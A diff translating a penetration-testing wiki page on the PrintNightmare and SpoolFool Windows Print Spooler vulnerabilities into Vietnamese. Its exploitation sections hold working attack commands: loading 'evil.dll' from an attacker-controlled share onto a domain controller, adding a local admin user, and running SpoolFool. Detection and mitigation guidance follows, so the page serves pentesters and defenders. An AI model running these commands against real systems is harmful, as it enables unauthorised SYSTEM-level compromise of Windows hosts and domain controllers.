@@ -1,29 +1,29 @@
-# PrintNightmare (Windows Print Spooler RCE/LPE)
+# PrintNightmare (RCE/LPE trên Windows Print Spooler)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> PrintNightmare is the collective name given to a family of vulnerabilities in the Windows **Print Spooler** service that allow **arbitrary code execution as SYSTEM** and, when the spooler is reachable over RPC, **remote code execution (RCE) on domain controllers and file servers**. The most-widely exploited CVEs are **CVE-2021-1675** (initially classed as LPE) and **CVE-2021-34527** (full RCE). Subsequent issues such as **CVE-2021-34481 (“Point & Print”)** and **CVE-2022-21999 (“SpoolFool”)** prove that the attack surface is still far from closed.
+> PrintNightmare là tên gọi chung của một nhóm lỗ hổng trong dịch vụ **Print Spooler** của Windows, cho phép **thực thi mã tùy ý với quyền SYSTEM** và, khi có thể truy cập spooler qua RPC, **thực thi mã từ xa (RCE) trên bộ điều khiển miền và máy chủ tệp**. Các CVE bị khai thác nhiều nhất là **CVE-2021-1675** (ban đầu được phân loại là LPE) và **CVE-2021-34527** (RCE đầy đủ). Các vấn đề tiếp theo như **CVE-2021-34481 (“Point & Print”)** và **CVE-2022-21999 (“SpoolFool”)** cho thấy bề mặt tấn công vẫn chưa được khắc phục triệt để.
 
-If you are looking for **authentication coercion / relay** via the spooler rather than **driver-based RCE/LPE**, check [this other page about printer coercion abuse](printers-spooler-service-abuse.md). This page is focused on **loading drivers / DLLs as SYSTEM**.
+Nếu bạn đang tìm hiểu về **ép xác thực / relay** thông qua spooler thay vì **RCE/LPE dựa trên driver**, hãy xem [trang khác về lạm dụng printer coercion](printers-spooler-service-abuse.md). Trang này tập trung vào **việc tải driver / DLL với quyền SYSTEM**.
 
 ---
 
-## 1. Vulnerable components & CVEs
+## 1. Các thành phần dễ bị tấn công & CVE
 
-| Year | CVE | Short name | Primitive | Notes |
+| Năm | CVE | Tên ngắn | Kỹ thuật cơ bản | Ghi chú |
 |------|-----|------------|-----------|-------|
-|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Patched in June 2021 CU but bypassed by CVE-2021-34527|
-|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` allows authenticated users to load a driver DLL from a remote share; post-August 2021 this usually requires weakened Point & Print policies|
-|2021|CVE-2021-34481|“Point & Print”|LPE|Unsigned driver installation by non-admin users|
-|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrary directory creation → DLL planting – works after 2021 patches|
+|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Được vá trong bản cập nhật tích lũy tháng 6 năm 2021 nhưng bị vượt qua bởi CVE-2021-34527|
+|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` cho phép người dùng đã xác thực tải DLL driver từ một share từ xa; sau tháng 8 năm 2021, thao tác này thường yêu cầu các chính sách Point & Print bị nới lỏng|
+|2021|CVE-2021-34481|“Point & Print”|LPE|Người dùng không phải admin có thể cài đặt driver chưa ký|
+|2022|CVE-2022-21999|“SpoolFool”|LPE|Tạo thư mục tùy ý → cài DLL độc hại – hoạt động sau các bản vá năm 2021|
 
-All of them abuse one of the **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) or trust relationships inside **Point & Print**.
+Tất cả đều lạm dụng một trong các **phương thức RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) hoặc các quan hệ tin cậy bên trong **Point & Print**.
 
-## 2. Exploitation techniques
+## 2. Các kỹ thuật khai thác
 
-### 2.1 Remote Domain Controller compromise (CVE-2021-34527)
+### 2.1 Chiếm quyền điều khiển Domain Controller từ xa (CVE-2021-34527)
 
-An authenticated but **non-privileged** domain user can run arbitrary DLLs as **NT AUTHORITY\SYSTEM** on a remote spooler (often the DC) by:
+Người dùng miền đã xác thực nhưng **không có đặc quyền** có thể chạy DLL tùy ý với quyền **NT AUTHORITY\SYSTEM** trên một spooler từ xa (thường là DC) bằng cách:
 
 ```powershell
 # 1. Host malicious driver DLL on a share the victim can reach
@@ -35,61 +35,61 @@ python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
        '\\attacker_IP\share\evil.dll'
 ```
 
-Popular PoCs include **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) and Benjamin Delpy’s `misc::printnightmare / lsa::addsid` modules in **mimikatz**.
+Các PoC phổ biến gồm **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) và các module `misc::printnightmare / lsa::addsid` của Benjamin Delpy trong **mimikatz**.
 
-### 2.2 Local privilege escalation (any supported Windows, 2021-2024)
+### 2.2 Leo thang đặc quyền cục bộ (mọi phiên bản Windows được hỗ trợ, 2021-2024)
 
-The same API can be called **locally** to load a driver from `C:\Windows\System32\spool\drivers\x64\3\` and achieve SYSTEM privileges:
+Có thể gọi cùng API **cục bộ** để tải driver từ `C:\Windows\System32\spool\drivers\x64\3\` và đạt được đặc quyền SYSTEM:
 
 ```powershell
 Import-Module .\Invoke-Nightmare.ps1
 Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
 ```
 
-### 2.3 Modern triage on patched hosts
+### 2.3 Phân loại hiện đại trên các máy chủ đã cập nhật
 
-On a fully updated host, public PrintNightmare PoCs often fail because Windows now defaults to **administrator-only** printer driver installation (`RestrictDriverInstallationToAdministrators=1` since August 10, 2021). Before throwing an exploit at a target, first check whether the environment rolled that safety change back for legacy printer deployments:<sup>[[3]](#references)</sup>
+Trên một máy chủ đã được cập nhật đầy đủ, các PoC PrintNightmare công khai thường thất bại vì Windows hiện mặc định chỉ cho phép **quản trị viên** cài đặt driver máy in (`RestrictDriverInstallationToAdministrators=1` kể từ ngày 10 tháng 8 năm 2021). Trước khi thử khai thác mục tiêu, hãy kiểm tra xem môi trường có hoàn tác thay đổi an toàn này để hỗ trợ triển khai máy in cũ hay không:<sup>[[3]](#references)</sup>
 
 ```cmd
 reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
 ```
 
-The two most interesting weak values are usually:<sup>[[3]](#references)</sup>
+Hai giá trị cấu hình yếu đáng chú ý nhất thường là:<sup>[[3]](#references)</sup>
 
 - `RestrictDriverInstallationToAdministrators = 0`
 - `NoWarningNoElevationOnInstall = 1`
 
-From Linux, quickly confirm that the target exposes the relevant print RPC interfaces before running a PoC:
+Từ Linux, hãy nhanh chóng xác nhận mục tiêu công khai các giao diện print RPC liên quan trước khi chạy PoC:
 
 ```bash
 rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
 ```
 
-Some newer public tooling also gives you a safer **check/list** workflow before sending a DLL:
+Một số công cụ công khai mới hơn cũng cung cấp cho bạn quy trình **check/list** an toàn hơn trước khi gửi một DLL:
 
 ```bash
 python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
 python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
 ```
 
-> If you get `RPC_E_ACCESS_DENIED` (`0x8001011b`) as a low-privileged user, you are usually seeing the post-2021 default rather than a transport failure.
+> Nếu bạn nhận được `RPC_E_ACCESS_DENIED` (`0x8001011b`) khi dùng tài khoản có đặc quyền thấp, thường là bạn đang gặp cấu hình mặc định sau năm 2021, chứ không phải lỗi truyền tải.
 
-> On Windows 11 22H2+ and newer client builds, remote printing defaults to **RPC over TCP** and **RPC over named pipes** (`\PIPE\spoolss`) is disabled unless explicitly re-enabled. Some older PoCs and lab notes still assume the named pipe is reachable.<sup>[[4]](#references)</sup>
+> Trên Windows 11 22H2+ và các bản dựng client mới hơn, in từ xa mặc định dùng **RPC over TCP** và tắt **RPC over named pipes** (`\PIPE\spoolss`), trừ khi được bật lại rõ ràng. Một số PoC cũ và ghi chú lab vẫn giả định named pipe có thể truy cập được.<sup>[[4]](#references)</sup>
 
-### 2.4 Package Point & Print abuse on “patched” networks
+### 2.4 Lạm dụng Package Point & Print trên các mạng đã “vá”
 
-Many enterprise environments stayed **vulnerable by policy** after the original 2021 patches because helpdesk or print-server workflows still required non-admin users to install/update drivers. In practice, the offensive playbook becomes:
+Nhiều môi trường doanh nghiệp vẫn **dễ bị tấn công do chính sách** sau các bản vá ban đầu năm 2021, vì quy trình của helpdesk hoặc print server vẫn yêu cầu người dùng không phải quản trị viên cài đặt/cập nhật driver. Trên thực tế, playbook tấn công sẽ là:
 
-- If security prompts are fully disabled, **classic arbitrary-DLL PrintNightmare** is still the shortest path.
-- If `Only use Package Point and Print` is enabled, you usually need to pivot to a **signed package-aware driver** path rather than a raw DLL drop.<sup>[[3]](#references)</sup>
-- 2024 research showed that **`Package Point and Print - Approved servers` is not a hard trust boundary by itself**: if an attacker can spoof or hijack name resolution for one approved print server, victims can still be redirected to a malicious server that satisfies policy checks.<sup>[[4]](#references)</sup>
-- Even combining UNC hardening with forced RPC-over-SMB can be brittle because modern clients may **fall back to RPC over TCP**.<sup>[[4]](#references)</sup>
+- Nếu các lời nhắc bảo mật bị tắt hoàn toàn, **PrintNightmare với DLL tùy ý kiểu cổ điển** vẫn là con đường ngắn nhất.
+- Nếu bật `Only use Package Point and Print`, thường cần chuyển sang con đường dùng **driver có chữ ký và hỗ trợ package-aware** thay vì thả DLL thô.<sup>[[3]](#references)</sup>
+- Nghiên cứu năm 2024 cho thấy **`Package Point and Print - Approved servers` tự nó không phải là ranh giới tin cậy vững chắc**: nếu kẻ tấn công có thể giả mạo hoặc chiếm quyền phân giải tên của một print server được phê duyệt, nạn nhân vẫn có thể bị chuyển hướng đến một server độc hại vượt qua các bước kiểm tra chính sách.<sup>[[4]](#references)</sup>
+- Ngay cả khi kết hợp UNC hardening với việc buộc dùng RPC-over-SMB, cấu hình vẫn có thể thiếu ổn định vì các client hiện đại có thể **chuyển về RPC over TCP**.<sup>[[4]](#references)</sup>
 
-This is why modern PrintNightmare-style exploitation is often more about **abusing enterprise printer deployment policy** than replaying the original 2021 PoC unchanged.
+Đây là lý do việc khai thác theo kiểu PrintNightmare hiện đại thường xoay quanh **lạm dụng chính sách triển khai máy in của doanh nghiệp** hơn là chạy lại nguyên xi PoC năm 2021.
 
-### 2.5 SpoolFool (CVE-2022-21999) – bypassing 2021 fixes
+### 2.5 SpoolFool (CVE-2022-21999) – vượt qua các bản sửa lỗi năm 2021
 
-Microsoft’s 2021 patches blocked remote driver loading but **did not harden directory permissions**. SpoolFool abuses the `SpoolDirectory` parameter to create an arbitrary directory under `C:\Windows\System32\spool\drivers\`, drops a payload DLL, and forces the spooler to load it:<sup>[[2]](#references)</sup>
+Các bản vá năm 2021 của Microsoft đã chặn việc tải driver từ xa nhưng **không siết chặt quyền thư mục**. SpoolFool lạm dụng tham số `SpoolDirectory` để tạo thư mục tùy ý bên dưới `C:\Windows\System32\spool\drivers\`, thả một payload DLL vào đó và buộc spooler tải DLL này:<sup>[[2]](#references)</sup>
 
 ```powershell
 # Binary version (local exploit)
@@ -99,56 +99,55 @@ SpoolFool.exe -dll add_user.dll
 Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
 ```
 
-> The exploit works on fully-patched Windows 7 → Windows 11 and Server 2012R2 → 2022 before February 2022 updates<sup>[[2]](#references)</sup>
+> Exploit hoạt động trên Windows 7 → Windows 11 và Server 2012R2 → 2022 đã cài đầy đủ bản vá, trước các bản cập nhật tháng 2 năm 2022<sup>[[2]](#references)</sup>
 
 ---
 
-## 3. Detection & hunting
+## 3. Phát hiện & săn tìm
 
-* **PrintService logs** – enable the *Microsoft-Windows-PrintService/Operational* channel and watch for **Event ID 316** (driver added/updated, usually includes the DLL names) on both successful and failed attempts. Pair it with **Event ID 808/811** for suspicious spooler module/driver load failures.
-* **Sysmon** – `Event ID 7` (Image loaded) or `11/23` (File write/delete) inside `C:\Windows\System32\spool\drivers\*` when the parent process is **spoolsv.exe**.
-* **Process lineage** – alert whenever **spoolsv.exe** spawns `cmd.exe`, `rundll32.exe`, PowerShell, or any unexpected unsigned child process.
-* **Network telemetry** – unexpected SMB fetches from `spoolsv.exe` to attacker-controlled shares or unusual printer RPC traffic from servers that should not behave as print servers are both high-signal leads.
+* **Nhật ký PrintService** – bật kênh *Microsoft-Windows-PrintService/Operational* và theo dõi **Event ID 316** (đã thêm/cập nhật driver, thường có tên DLL) trong cả những lần thử thành công lẫn thất bại. Kết hợp với **Event ID 808/811** để phát hiện lỗi tải module/driver spooler đáng ngờ.
+* **Sysmon** – `Event ID 7` (Image loaded) hoặc `11/23` (ghi/xóa tệp) bên trong `C:\Windows\System32\spool\drivers\*` khi tiến trình cha là **spoolsv.exe**.
+* **Nguồn gốc tiến trình** – cảnh báo bất cứ khi nào **spoolsv.exe** khởi chạy `cmd.exe`, `rundll32.exe`, PowerShell hoặc tiến trình con không ký số bất thường.
+* **Telemetry mạng** – các lượt tải SMB bất thường từ **spoolsv.exe** đến các share do attacker kiểm soát, hoặc lưu lượng RPC máy in bất thường từ máy chủ không nên hoạt động như print server, đều là những dấu hiệu có giá trị cao.
 
-## 4. Mitigation & hardening
+## 4. Giảm thiểu & tăng cường bảo mật
 
-1. **Patch!** – Apply the latest cumulative update on every Windows host that has the Print Spooler service installed.
-2. **Disable the spooler where it is not required**, especially on Domain Controllers:
+1. **Vá lỗi!** – Cài bản cập nhật tích lũy mới nhất trên mọi máy Windows có cài dịch vụ Print Spooler.
+2. **Tắt spooler ở những nơi không cần thiết**, đặc biệt là trên Domain Controller:
    ```powershell
    Stop-Service Spooler -Force
    Set-Service Spooler -StartupType Disabled
    ```
-3. **Block remote connections** while still allowing local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
-4. **Keep Point & Print admin-only** by setting:
+3. **Chặn kết nối từ xa** nhưng vẫn cho phép in cục bộ – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
+4. **Chỉ cho phép quản trị viên sử dụng Point & Print** bằng cách đặt:
    ```cmd
    reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
            /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
    ```
-   Detailed guidance in Microsoft KB5005652<sup>[[1]](#references)</sup>
-5. If business requirements force `RestrictDriverInstallationToAdministrators=0`, treat every other printer policy as a **partial mitigation only**. At minimum, prefer **package-aware drivers**, enable **Only use Package Point and Print**, and restrict **Package Point and Print - Approved servers** to explicit in-forest print servers.<sup>[[3]](#references)</sup>
-6. **Do not roll back printer RPC privacy** just to fix broken printer mappings. Environments that set `RpcAuthnLevelPrivacyEnabled=0` are undoing hardening added for **CVE-2021-1678** and usually deserve extra scrutiny during an engagement.<sup>[[4]](#references)</sup>
+   Hướng dẫn chi tiết trong Microsoft KB5005652<sup>[[1]](#references)</sup>
+5. Nếu yêu cầu kinh doanh buộc phải đặt `RestrictDriverInstallationToAdministrators=0`, hãy xem mọi chính sách máy in khác chỉ là **biện pháp giảm thiểu một phần**. Tối thiểu, hãy ưu tiên **driver hỗ trợ package**, bật **Only use Package Point and Print** và giới hạn **Package Point and Print - Approved servers** vào các print server rõ ràng trong forest.<sup>[[3]](#references)</sup>
+6. **Không hoàn tác quyền riêng tư của printer RPC** chỉ để khắc phục lỗi ánh xạ máy in. Các môi trường đặt `RpcAuthnLevelPrivacyEnabled=0` đang gỡ bỏ biện pháp hardening được thêm vào để ứng phó với **CVE-2021-1678** và thường cần được xem xét kỹ hơn trong quá trình engagement.<sup>[[4]](#references)</sup>
 
 ---
 
-## 5. Related research / tools
+## 5. Nghiên cứu / công cụ liên quan
 
-* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
-* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standard Impacket implementation with `-check`, `-list`, and `-delete` modes
-* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper with built-in SMB delivery, multi-target support, and both `MS-RPRN` / `MS-PAR` modes
+* Các module [`printnightmare` của mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
+* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – triển khai Impacket tiêu chuẩn với các chế độ `-check`, `-list` và `-delete`
+* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper tích hợp sẵn khả năng phân phối qua SMB, hỗ trợ nhiều mục tiêu và cả hai chế độ `MS-RPRN` / `MS-PAR`
 * SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
-* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – bring-your-own-vulnerable-printer-driver abuse through package Point & Print
-* SpoolFool exploit & write-up
-* 0patch micropatches for SpoolFool and other spooler bugs
+* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – lạm dụng driver máy in dễ bị tấn công do bạn cung cấp thông qua package Point & Print
+* Exploit và bài phân tích SpoolFool
+* Các micropatch của 0patch cho SpoolFool và những lỗi spooler khác
 
-If you want to **coerce authentication** via the spooler instead of loading a driver, jump to [printer spooler service abuse](printers-spooler-service-abuse.md).
+Nếu bạn muốn **ép xác thực** thông qua spooler thay vì tải driver, hãy chuyển đến [lạm dụng dịch vụ printer spooler](printers-spooler-service-abuse.md).
 
 ---
 
 ## References
 
-- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
+- [1] [Microsoft – KB5005652: Quản lý hành vi cài đặt driver mặc định mới của Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
 - [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
-- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
-- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)
-
+- [3] [itm4n – Hướng dẫn thực tế về PrintNightmare năm 2024](https://itm4n.github.io/printnightmare-exploitation/)
+- [4] [itm4n – PrintNightmare vẫn chưa kết thúc](https://itm4n.github.io/printnightmare-not-over/)
 {{#include ../../banners/hacktricks-training.md}}
